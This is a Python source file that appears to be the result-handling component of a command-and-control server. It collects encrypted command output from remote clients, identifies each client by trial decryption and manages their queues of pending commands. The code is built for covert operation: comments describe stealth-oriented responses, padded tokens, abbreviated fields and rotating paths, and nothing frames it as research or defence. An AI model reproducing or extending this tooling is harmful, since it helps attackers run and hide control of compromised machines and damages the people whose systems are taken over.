import json
import logging
import base64
import re
from handlers.base_handler import BaseHandler

logger = logging.getLogger(__name__)

class ResultHandler(BaseHandler):
    """Handler for command result data from clients"""
    
    def __init__(self, request_handler, client_manager, crypto_helper, client_helper, path_router):
        super().__init__(request_handler, client_manager, crypto_helper, client_helper, path_router)
        # Add tracking for processed rotation results
        self.processed_rotation_results = {}
    
    def handle(self):
        """Process command result data from client"""
        # Get the operation payload
        payload = self.get_operation_payload()
        
        if payload:
            # Modern approach - operation payload from OperationRouter
            try:
                # Check if we have timestamp and result in the payload
                if "timestamp" in payload and "result" in payload:
                    # Extract timestamp and result
                    timestamp = payload["timestamp"]
                    result = payload["result"]
                    
                    # Identify client from the request
                    client_id = None
                    
                    if hasattr(self.request_handler, 'client_id'):
                        client_id = self.request_handler.client_id
                    
                    if not client_id:
                        # If we don't have the client ID, try to get it from the client address
                        client_id = self._identify_client_by_ip()
                    
                    if not client_id:
                        self.log_message(f"Cannot identify client for result processing")
                        self.send_error_response(401, "Authentication failed")
                        return
                    
                    # Add the result to the command history
                    success = self.client_manager.add_command_result(client_id, timestamp, result)
                    
                    # Send success response
                    self.send_success_response()
                    
                    # If this was a path rotation result, track it
                    if "Path rotation updated: ID" in result:
                        # Extract rotation ID from the result
                        rotation_id_match = re.search(r"ID (\d+)", result)
                        if rotation_id_match and client_id:
                            rotation_id = rotation_id_match.group(1)
                            
                            # Initialize tracking for this client if needed
                            if client_id not in self.processed_rotation_results:
                                self.processed_rotation_results[client_id] = set()
                                
                            # Track this rotation result
                            self.processed_rotation_results[client_id].add(rotation_id)
                            
                    # Remove the command from pending queue
                    self._remove_from_pending(client_id, timestamp)
                else:
                    self.log_message(f"Invalid result payload format")
                    self.send_error_response(400, "Invalid payload format")
            except Exception as e:
                logger.error(f"Error processing operation payload: {e}")
                self.send_error_response(500, "Server error")
        else:
            # Legacy approach - parse from request body
            self.log_message(f"ResultHandler received request from {self.client_address[0]}")
            
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length == 0:
                self.log_message(f"Missing content from {self.client_address[0]}")
                self.send_error_response(400, "Missing content")
                return
                
            self.log_message(f"Reading {content_length} bytes of result data")
            request_body = self.request_handler.rfile.read(content_length).decode('utf-8')
            
            try:
                # Parse the request body JSON
                body_data = json.loads(request_body)
                
                # Get encrypted data (using abbreviated field name 'd' instead of 'data')
                encrypted_data = body_data.get('d')
                if not encrypted_data:
                    # Try original field name as fallback
                    encrypted_data = body_data.get('data')
                
                # Extract token padding (if present - discard it since we don't need it)
                token = body_data.get('t', '') or body_data.get('token', '')
                if token:
                    self.log_message(f"Received result with {len(token)} bytes of token padding")
                
                if not encrypted_data:
                    self.log_message(f"No data provided in request from {self.client_address[0]}")
                    self.send_error_response(400, "Missing data")
                    return
                    
                # For backward compatibility - get client ID if provided
                provided_client_id = body_data.get('c') or body_data.get('client_id') or body_data.get('id')
                
                # Identify client by key-based decryption
                client_id, decrypted_data = self.crypto_helper.identify_client_by_decryption(encrypted_data)
                
                # If decryption-based ID failed but client_id was provided
                if client_id is None and provided_client_id:
                    client_id = provided_client_id
                    self.log_message(f"Using provided client ID: {client_id} due to decryption failure")
                    
                    # Try decryption with the provided client ID
                    try:
                        decrypted_data = self.crypto_helper.decrypt(encrypted_data, client_id)
                    except Exception as e:
                        self.log_message(f"Decryption failed with provided client ID: {e}")
                
                if client_id is None and decrypted_data is None:
                    self.log_message(f"Could not identify client - authentication failed")
                    self.send_error_response(400, "Authentication failed")
                    return
                    
                self.log_message(f"Identified client from result: {client_id}")
                
                # Process the result
                try:
                    result_data = decrypted_data
                    is_structured = False
                    timestamp = None
                    result = None
                    
                    # Try to parse as JSON
                    try:
                        if result_data:
                            result_json = json.loads(result_data)
                            if isinstance(result_json, dict) and 'timestamp' in result_json and 'result' in result_json:
                                # This is a structured result
                                is_structured = True
                                timestamp = result_json['timestamp']
                                result = result_json['result']
                    except json.JSONDecodeError:
                        # Not JSON, use as raw result
                        self.log_message(f"Data is not valid JSON, using as raw result")
                        result = result_data
                    
                    # Process structured result if parsed successfully
                    if is_structured and timestamp and result:
                        # Check for duplicate path rotation results
                        if "Path rotation updated: ID" in result:
                            # Extract rotation ID from the result
                            rotation_id_match = re.search(r"ID (\d+)", result)
                            if rotation_id_match:
                                rotation_id = rotation_id_match.group(1)
                                
                                # Initialize tracking for this client if needed
                                if client_id not in self.processed_rotation_results:
                                    self.processed_rotation_results[client_id] = set()
                                    
                                # Check if we've already processed this rotation ID for this client
                                if rotation_id in self.processed_rotation_results[client_id]:
                                    self.log_message(f"Skipping duplicate path rotation result for ID {rotation_id}")
                                    # Send success response but don't process the duplicate
                                    self.send_success_response()
                                    return
                                    
                                # Track this rotation result
                                self.processed_rotation_results[client_id].add(rotation_id)
                        
                        # Add the result to the command history
                        success = self.client_manager.add_command_result(client_id, timestamp, result)
                        self.log_message(f"Result processed for client {client_id} (timestamp: {timestamp}), success: {success}")
                        
                        # Remove the command from pending queue since we have the result
                        self._remove_from_pending(client_id, timestamp)
                    else:
                        # Handle unstructured result or fallbacks
                        self._handle_unstructured_result(client_id, result_data)
                    
                    # Send success response - simplified to just a standard "OK" for stealthiness
                    self.send_success_response()
                    
                except Exception as e:
                    logger.error(f"Error processing command result: {e}")
                    # Still send a success response to prevent client from retrying endlessly
                    self.send_success_response()
                    
            except json.JSONDecodeError:
                self.log_message(f"Invalid JSON in request body from {self.client_address[0]}")
                self.send_error_response(400, "Invalid JSON format")
    
    def _remove_from_pending(self, client_id, timestamp):
        """Remove a command from pending once its result is received"""
        if client_id in self.client_manager.get_clients_info():
            pending_commands = self.client_manager.get_pending_commands(client_id)
            # Find and remove the command with matching timestamp
            for i, cmd in enumerate(pending_commands):
                if cmd.get("timestamp") == timestamp:
                    # Remove this specific command from pending
                    self.log_message(f"Removing completed command with timestamp {timestamp} from pending for client {client_id}")
                    self.client_manager.clear_pending_commands(client_id)
                    
                    # Re-add any other pending commands that weren't completed
                    for j, other_cmd in enumerate(pending_commands):
                        if j != i:
                            self.client_manager.add_command(
                                client_id,
                                other_cmd.get("command_type", "unknown"),
                                other_cmd.get("args", "")
                            )
                    break
    
    def _handle_unstructured_result(self, client_id, result_data):
        """Handle unstructured (non-JSON) command results"""
        self.log_message(f"Unstructured result received from {client_id}")
        self.client_manager.log_event(client_id, "Command Result Received", result_data)